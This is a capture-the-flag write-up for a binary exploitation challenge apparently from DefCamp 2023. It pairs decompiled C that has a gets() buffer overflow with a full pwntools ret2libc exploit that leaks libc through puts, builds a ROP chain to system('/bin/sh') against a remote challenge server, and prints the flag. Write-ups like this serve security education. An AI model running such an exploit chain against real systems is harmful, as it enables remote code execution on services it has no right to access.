## Challenge Description

Maybe you can get a free menu!!

Flag format: CTF{sha256}

### Intuition

Checksec the binary to see what we have.

```  
$ checksec restaurant  
LIBC_FILE=/lib/x86_64-linux-gnu/libc.so.6  
RELRO           STACK CANARY      NX            PIE             RPATH
RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE  
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No
RUNPATH   70 Symbols        No    0               2               restaurant  
```  
Partial RELRO and no PIE. Great! Let's decompile:

```c  
undefined8 custom(void)  
{  
 char local_78 [112];  
  
 printf("Choose what you want to eat:");  
 gets(local_78);  
 gets(local_78);  
 return 0;  
}

undefined8 main(EVP_PKEY_CTX *param_1)  
{  
 int local_c;  
  
 init(param_1);  
 puts("==============================");  
 puts("              MENU             ");  
 puts("==============================");  
 puts("1. Chessburger...............2$");  
 puts("2. Hamburger.................3$");  
 puts("3. Custom dinner............10$");  
 printf(">> ");  
 __isoc99_scanf(&DAT_0040098c,&local_c);  
 if (local_c == 2) {  
   puts("2. Hamburger.................3$");  
 }  
 else {  
   if (local_c == 3) {  
     custom();  
   }  
   else if (local_c == 1) {  
     puts("1. Chessburger...............2$");  
     return 0;  
   }  
   puts("Wrong choice");  
 }  
 return 0;  
}  
```  
We see an obvious buffer overflow in ``custom``. We simply need to ROP into
leaking the libc addresses with puts.

### Solution

```py  
#!/usr/bin/env python3

from pwn import *

#target = process("./restaurant")  
target = remote("35.198.129.115", 31756)

# Get addresses with ROPGadget  
pop_rdi = p64(0x00000000004008a3)  
ret = p64(0x000000000040059e) # for aligning stack to 16-bytes again for
system call

# Addresses from the binary  
main_addr = p64(0x0040072a)  
puts_plt = p64(0x004005b0)  
puts_got = p64(0x00601018)

# Leak puts address  
target.sendline(b"3")  
payload = b"a" * 0x78 + pop_rdi + puts_got + puts_plt + main_addr # go back to
main for more inputs  
target.sendline(payload)  
print(target.recvuntil(b">>"))  
puts_leak = u64(target.recvline().strip().split(b':')[1].ljust(8, b'\x00'))  
print(puts_leak)  
print(hex(puts_leak))

# Find the libc version at some point here manually

system_addr = p64(puts_leak - 0x31550) # offset found in libc database  
print(system_addr)

# Get offset to /bin/sh from libc database  
sh_addr = p64(puts_leak + 0x13337a)

payload = b"a" * 0x78 + ret + pop_rdi + sh_addr + system_addr

# Pop a shell, baby  
target.sendline(payload)  
target.interactive()  
```

#### Flag

```CTF{33be4238b68642a4c3f97d10cfa034764e0b6d9707d6970f581200e2b7bcbfc0}```

Original writeup (https://dothidden.xyz/defcamp_quals_2023/bistro/).